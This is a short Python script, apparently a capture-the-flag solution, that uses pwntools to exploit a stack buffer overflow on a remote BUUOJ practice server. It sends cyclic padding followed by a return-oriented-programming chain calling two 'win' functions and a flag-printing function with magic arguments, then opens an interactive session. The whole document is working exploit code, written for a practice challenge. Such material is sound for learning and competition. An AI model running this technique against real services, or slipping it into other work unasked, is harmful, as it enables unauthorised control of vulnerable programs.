from pwn import *


p = remote("node4.buuoj.cn", 26959)


win1 = 0x080485CB 
win2 = 0x080485D8
flag = 0x0804862B

# use rop chain to print flag
pad = cyclic(0x18+0x4)
pad += p32(win1)+p32(win2)+p32(flag)+p32(0xBAAAAAAD)+p32(0xDEADBAAD)
p.sendline(pad)

p.interactive()

